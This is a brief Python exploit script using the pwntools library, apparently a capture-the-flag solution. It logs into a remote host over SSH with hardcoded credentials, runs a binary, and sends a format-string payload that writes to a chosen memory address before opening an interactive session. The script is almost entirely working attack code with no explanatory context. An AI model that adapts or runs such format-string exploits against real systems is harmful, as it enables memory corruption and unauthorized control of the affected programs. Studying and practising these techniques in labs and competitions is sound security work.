from pwn import *

s = ssh(user='user',host='218.158.141.199',port = 26734, password='user')
p = s.run('./50')
#p = process('./50')

pause()
context.log_level = "debug"

p.recv()

payload = '%16777088c%14$na' + p64(0x6d7335)# '\x34\x73\x6d\x00\x00\x00'
#payload = 'aaa%13$n' +'\x34\x73\x6d\x00\x00\x00'

p.sendline(payload)

p.interactive()
